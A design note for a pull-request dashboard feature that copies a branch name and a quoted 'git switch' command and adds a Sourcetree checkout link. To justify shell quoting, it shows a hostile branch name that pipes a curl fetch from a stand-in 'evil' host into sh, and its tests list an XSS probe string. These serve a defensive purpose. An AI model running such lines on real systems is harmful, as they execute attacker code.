# Copy a pull request's branch and its checkout command

**Date:** 2026-10-27
**Issue:** none (asked by the user on 2026-10-27)
**Target version:** 3.2.0

Reviewed with the user: the placement (icons after the title, then moved
after the open tasks on 2026-10-28), the keys (`c`, `b`), the module
(option A below) and, after the implementation, `git switch` in place of
`git checkout` (2026-10-28), then a third action, the branch opened in
Sourcetree (2026-10-28, §3.5). The rest is *Decided*.

## 1. Problem

To work on a pull request locally, its source branch has to be found in
Bitbucket and typed or copied by hand: the row shows no branch name (only
the root branches have a header). The user wants two buttons on each
pull request: one copying the command switching to the branch, one
copying the branch name.

## 2. Data

`pullRequest.source.branch.name` is already in every pull request of
`/api/pull-requests/:project`, in the fixtures too. No server change.

## 3. Design

### 3.1 What is copied

- **Branch name**: `source.branch.name` as it is.
- **Switch command**: `git switch <branch>`, from a pure
  `switchCommand(branch)`. *Decided*: a branch name is untrusted text
  that ends up in a shell. Git allows `$`, `;`, `|`, `&`, `` ` ``, `(`,
  `)`, `<`, `>`, `!`, `#`, `{`, `}` and both quotes in a branch name, so
  anyone who can push may name a branch ``x;curl${IFS}evil|sh``, and
  pasting the command would run it. A name made only of letters, digits
  and `. _ / - + @ = , %` is left bare (`git switch feature/ABC-1-export`);
  any other is put in single quotes, each `'` in it written `'\''`
  (`git switch 'x;curl${IFS}evil|sh'`). Git forbids spaces, control
  characters and `~ ^ : ? * [ \` in a branch name.
- **Read by git as a branch only**: the review of the branch found that
  `git checkout docs`, with a branch `docs` not fetched yet, restores the
  folder `docs/` from the index, losing its changes. The command first
  ended with `--` (`git checkout docs --`); the user then chose
  `git switch`, which never reads a path: it creates the branch from a
  fetched remote branch, as `git checkout` does, and fails ("invalid
  reference") otherwise. A name starting with `-` follows
  `--end-of-options` (`git switch --end-of-options --detach`):
  `git check-ref-format --branch` refuses a leading `-`, but
  `refs/heads/--detach` can be pushed, and `git switch --detach` would
  leave the branch for a detached HEAD (`git checkout -f` would have
  thrown the uncommitted changes away). Checked with git 2.54 and zsh.
- **A pull request from a fork** (#127): the same command, although the
  branch is not in the destination clone. *Decided*: #127 covers forks
  across the page; a comment there records this case.

### 3.2 The row

Two `<button type="button" class="copy-button …">` at the end of the
line of the participants, after the commit counts and the open tasks
(first placed after the title and the Draft badge; moved by the user so
the title line holds the title only):

| Button | Class | Icon | Copies | Accessible name |
|---|---|---|---|---|
| Branch | `copy-branch` | `fas fa-copy` | the branch name | Copy the branch name `<branch>` |
| Switch | `copy-switch` | `fas fa-terminal` | `switchCommand(branch)` | Copy `<command>` |

Each carries what it copies in `data-copy`, and `title="Copy: <text>"`;
every interpolated text goes through `escapeHtml` (NFR-SEC7); the icons
are `aria-hidden`. No inline handler, no `style=` attribute.

The icons are drawn in `--text-muted` (4.5:1 on the surface in both
themes), in `--text-color` when the row is hovered, holds the focus
(`:focus-within`) or is selected. Never hidden, so they stay discoverable
and clickable without hovering first; the 2px `:focus-visible` outline of
every control applies. A dimmed row (`.filtered`, shown for a match below
it) hides its participants line, the buttons with it; `c` and `b` still
click them. Root-branch headers and orphaned issues get no
buttons: a root branch is a destination (`master`), an orphaned issue has
no branch.

### 3.3 Copying and feedback

A new module, `public/copy-branch.js`:

- `switchCommand(branch)`: §3.1, pure.
- `handleCopyClick(event, options)`: returns `false` for a click outside
  a `.copy-button`; otherwise writes the button's `data-copy` with
  `navigator.clipboard.writeText` and returns `true`. `options` carries
  the clipboard, the status element and the timer functions, so the tests
  pass fakes; the defaults read `navigator` and `document` at call time,
  never at import time.
- **Success**: the button gets the class `copied`, its icon becomes
  `fa-check` in `--success-strong`, for 1.5 s; the status region says
  "Copied <text>".
- **Failure**: the clipboard API is missing outside a secure context (the
  page opened over plain http through `PR_TREE_HOST`), or `writeText`
  rejects (the document not focused, a permission refused). The button gets
  the class `copy-failed`, its icon becomes `fa-times` in `--error-strong`,
  its title and the status region give the reason, for 1.5 s. Missing API:
  "Copy failed: the clipboard needs https or localhost"; a rejection:
  "Copy failed: <message>".
- A second click within the 1.5 s restarts the period; the original icon,
  title and class come back after it.
- **Status region**: one `<span id="copyStatus" class="visually-hidden"
  role="status">` in index.html, outside the tree pane, so a re-render
  never replaces it. `.visually-hidden` is the usual clip pattern, new in
  styles.css.
- A re-render of the tree during the 1.5 s drops the feedback with the
  old button; the reset then touches a detached element, harmlessly.

**Wiring**: app.js keeps one click listener on the tree pane (pitfall
14), composing the two handlers:
`treePane.addEventListener('click', event => handleCopyClick(event) || handleTreeClick(event))`.
A click on a copy button toggles nothing either way (it is no toggle
button and not in a branch or a repository header), but the composition
says so explicitly. The click focuses the button, so the `focusin`
listener selects the row, as for the title link.

### 3.4 Keys

In `handleTreeKey` (tree-keyboard.js), on the row in sight:

- `c` clicks its `.copy-switch` button,
- `b` clicks its `.copy-branch` button,

as `o` and `i` click a link today (`openLink` becomes a `clickIn(row,
selector)` shared by the four). The feedback is the click's. On a
root-branch header or an orphaned issue, or with no row, the key is not
taken. app-shell.js's guards (typing, modifiers, help, open multi-select,
drawer) apply unchanged; neither key is used elsewhere.

### 3.5 Open in Sourcetree

Asked on 2026-10-28, after the copy buttons: a third control, after them,
checking the branch out in Sourcetree. *Decided* from what the two
products do, not from forum posts (the `sourcetree://` scheme has no
public documentation):

- **Sourcetree for Mac 4.2.19** (downloaded and inspected, never run)
  registers `sourcetree://` and parses
  `sourcetree://(checkoutRef|cloneRepo)?<query>`, with the keys `ref`,
  `cloneUrl` and `type` (`bitbucket` or `stash`). Its link window lists
  "Your existing clones of this project" and checks the branch out in
  the one chosen, or clones afresh; with uncommitted changes it asks
  whether to keep, stash or discard them. A clone whose remote does not
  match the link is refused ("Remote details do not match").
- **Bitbucket Cloud's "Check out in SourceTree"** (the branch page, read
  on a public repository): `sourcetree://checkoutRef?` followed by
  `ref=refs/heads/<branch>`, `cloneUrl=<the https clone URL>` and
  `type=bitbucket`, each value URL-encoded, always the https clone URL
  (`getCloneUrl("https", repository)`, whatever the user's SSH keys).
  Logged out: `https://bitbucket.org/<workspace>/<repository>.git`.

So the link is `sourcetreeUrl(branch, repositoryFullName)`, pure, in
copy-branch.js: those three keys in that order, `encodeURIComponent`
on each value, the clone URL
`https://bitbucket.org/<source.repository.full_name>.git` (the source
repository: a fork's for a pull request from a fork, which Sourcetree
then offers to clone, #127). Whole href through `escapeHtml` (its `&`
included). No link without a full name.

The row: an `<a class="sourcetree-link">` after the two buttons, in the
same group (`<span class="branch-actions">`, was `copy-buttons`), icon
`fab fa-sourcetree` (aria-hidden), `title="Check out in Sourcetree"`,
`aria-label="Check out <branch> in Sourcetree"`, no `target`: the
browser hands the link to Sourcetree (asking the first time) and the
page stays. Drawn like the buttons (muted, text colour on a hovered,
focused or selected row, primary on hover, no underline). A click
focuses it, so the row is selected; tree-toggle.js leaves links alone.

*Not verified*: logged in, Bitbucket's clone URL probably carries the
user's name (`https://<user>@bitbucket.org/…`, the form of the user's
clones); Sourcetree's matcher takes the user name apart
(`…cloneUrl:username:`), so the anonymous form should match those
clones. Sourcetree is not installed on the user's Mac: the first use
checks it.

## 4. Turned down

- **Copy logic in `handleTreeClick`** (option B): one fewer import in
  app.js, but tree-toggle.js would mix copying into folding.
- **Copy actions in the title popover** (option C): hover-only, hard to
  find, and the popover holds Bitbucket's rendered HTML.
- **The branch name shown on the row**: the user chose icons only; the
  tooltip shows the exact text copied.
- **Icons hidden until hover**: invisible to the keyboard and to a first
  look; muted is enough.
- **`git fetch && git switch`**: git's DWIM creates the tracking branch
  from a fetched remote branch; a fetch is the user's call.
- **`git checkout <branch> --`** (the first implementation): as safe, but
  the trailing `--` puzzles; `git switch` (git 2.23) needs none.
- **`document.execCommand('copy')` fallback** over plain http: deprecated;
  the dashboard runs on localhost, and the failure says why.
- **Buttons on root-branch headers**: a destination branch is checked out
  already, or copied from Bitbucket; nothing asked for it.
- **The SSH clone URL in the Sourcetree link**, or a setting choosing it:
  Bitbucket's own link is always https, and the user's clones are https.
- **The user name in the Sourcetree clone URL**: it would take a request
  for the account's name; Bitbucket's anonymous link has none.
- **A key for Sourcetree**: not asked; `c` and `b` cover the copies.

## 5. Tests

- `test/copy-branch.test.mjs`: `switchCommand` (a plain name; `$`, `;`,
  `|`, a backtick, `'` quoted; a `'` escaped); `handleCopyClick` on fake
  elements with a fake clipboard and timer: a click elsewhere returns
  `false` and writes nothing; a click on the button or its icon writes
  `data-copy`, sets `copied`, the check icon and the status text, and
  resets after the timer; a missing clipboard and a rejection set
  `copy-failed` with their reasons; a second click restarts the timer.
- `test/app-render.test.mjs`: both buttons on each pull request, their
  `data-copy`, `aria-label` and `title`, a hostile branch name
  (`"><img src=x onerror=alert(1)>` and ``a;b`c``) escaped in every
  attribute; none on root-branch headers nor orphaned issues.
- `test/tree-keyboard.test.mjs`: `c` and `b` click the right button of
  the pull request in sight; not taken on a header, an orphaned issue, or
  with no row.
- `test/server.test.mjs`: unchanged checks cover the new element ids and
  the absence of inline handlers; the status region is checked present.
- `test/styles.test.mjs`: the existing checks cover the new `color`
  declarations (strong tokens, muted text).
- Manual, fixture mode: click both buttons, paste, check the feedback;
  `c` and `b` on a selected row; both themes; hover, focus, selected.

## 6. Documentation

README.md: a changelog entry for 3.2.0 and the `c` / `b` keys in the
keyboard paragraph of the features (the other one is the 3.1.0 changelog
entry, released). PRD.md: a requirement line for the copy buttons and
the keys. package.json: 3.2.0 and its release date.
